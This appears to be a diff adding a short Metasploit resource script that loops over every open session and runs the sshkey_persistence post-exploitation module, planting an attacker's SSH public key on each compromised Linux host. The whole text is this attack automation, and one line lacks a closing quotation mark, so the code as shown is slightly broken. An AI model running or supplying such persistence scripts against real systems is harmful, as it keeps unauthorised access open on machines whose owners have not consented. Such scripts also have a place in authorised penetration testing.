@@ -1,0 +1,8 @@
+<ruby>
+framework.sessions.each_pair do |sid, session|
+    run_single("use post/linux/manage/sshkey_persistence")
+    run_single("set SESSION #{sid}")
+    run_single("set PUBKEY /home/user/Downloads/id_rsa.pub)
+    run_single("run")
+end
+</ruby>
